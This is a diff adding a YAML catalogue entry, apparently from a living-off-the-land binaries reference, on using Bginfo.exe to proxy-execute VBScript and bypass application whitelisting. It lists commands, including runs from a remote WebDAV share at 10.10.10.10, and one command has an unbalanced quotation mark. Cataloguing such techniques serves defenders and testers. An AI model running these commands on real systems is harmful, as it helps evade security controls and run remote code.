@@ -1,0 +1,41 @@
+---
+Name: 'Bginfo.exe'
+Description: 'Can be used to perform proxy execution of vbscript code. If Bginfo.exe is placed in whitelisted path it can be used to bypass AWL.'
+Created: '2018-06-12'
+Commands:
+  - Command: 'bginfo.exe bginfo.bgi /popup /nolicprompt'
+    Description: 'Execute VBscript code that is referenced within the bginfo.bgi file.'
+  - Command: '"\\10.10.10.10\webdav\bginfo.exe bginfo.bgi /popup /nolicprompt'
+    Description: 'Execute bginfo.exe from a WebDAV server.'
+  - Command: '"\\live.sysinternals.com\Tools\bginfo.exe" \\10.10.10.10\webdav\bginfo.bgi /popup /nolicprompt'
+    Description: 'This style of execution may not longer work due to patch.'
+Windows Binary: false
+Bypasses Default AppLocker Rules: false
+Notes: ''
+MITRE:
+  - ID: ''
+    Link: ''
+Atomic Red Teaming:
+  - Description: ''
+    Code: ''    
+Full path:
+  - Path: ''
+Verified on OS:
+  - Windows 10 1803: false
+  - Windows 10 1709: false
+  - Windows 10 1703: false
+  - Windows 10 1607: false
+  - Windows 10 1511: false
+  - Windows 10 1507: false
+  - Windows 8.1: false
+  - Windows 8: false
+  - Windows 7: false
+Resources:
+  - Link: 'https://oddvar.moe/2017/05/18/bypassing-application-whitelisting-with-bginfo/'
+  - Link: 'https://oddvar.moe/2017/05/22/clarification-bginfo-4-22-applocker-still-vulnerable/'
+  - Link: 'https://pentestlab.blog/2017/06/05/applocker-bypass-bginfo/'
+Acknowledgement:
+  - Name: 'Oddvar Moe'
+    TwitterHandle: '@oddvarmoe'
+    Blog: 'https://oddvar.moe'
+---
